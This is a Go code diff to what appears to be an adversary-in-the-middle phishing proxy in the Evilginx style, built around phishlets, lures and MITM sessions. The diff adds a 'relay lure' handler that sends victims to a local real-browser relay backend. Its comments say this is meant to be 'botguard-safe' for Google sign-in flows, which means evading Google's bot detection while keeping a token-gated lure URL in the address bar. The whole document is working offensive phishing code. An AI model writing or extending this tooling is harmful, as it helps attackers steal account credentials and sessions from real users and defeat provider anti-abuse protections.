@@ -442,6 +442,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
+								// relay lure: serve the real-browser relay page instead
+								// of creating a MITM session (botguard-safe Google flow)
+								if l.Relay {
+									log.Important("[%s] relay lure hit: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
+									return p.relayPage(req)
+								}
+
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									// set params from url arguments
@@ -1435,6 +1442,36 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		}
 	}
 	return req, nil
+}
+
+// relayPage serves the relay's root page for a RELAY LURE hit — the URL bar
+// keeps the lure path (nice, token-gated), only the XHRs go to /__relay/api.
+func (p *HttpProxy) relayPage(req *http.Request) (*http.Request, *http.Response) {
+	backend := os.Getenv("EG_RELAY_BACKEND")
+	if backend == "" {
+		backend = "http://127.0.0.1:9445"
+	}
+	u, err := url.Parse(backend)
+	if err != nil {
+		return p.blockRequest(req)
+	}
+	rp := httputil.NewSingleHostReverseProxy(u)
+	rr := httptest.NewRecorder()
+	r2 := req.Clone(context.Background())
+	r2.URL.Path = "/"
+	r2.URL.RawPath = ""
+	r2.RequestURI = ""
+	rp.ServeHTTP(rr, r2)
+	resp := goproxy.NewResponse(req, "text/html", rr.Code, "")
+	if resp != nil {
+		resp.Body = ioutil.NopCloser(bytes.NewReader(rr.Body.Bytes()))
+		resp.ContentLength = int64(rr.Body.Len())
+		if ct := rr.Header().Get("Content-Type"); ct != "" {
+			resp.Header.Set("Content-Type", ct)
+		}
+		return req, resp
+	}
+	return p.blockRequest(req)
 }
 
 // relayRequest reverse-proxies /__relay/* to the local real-browser relay
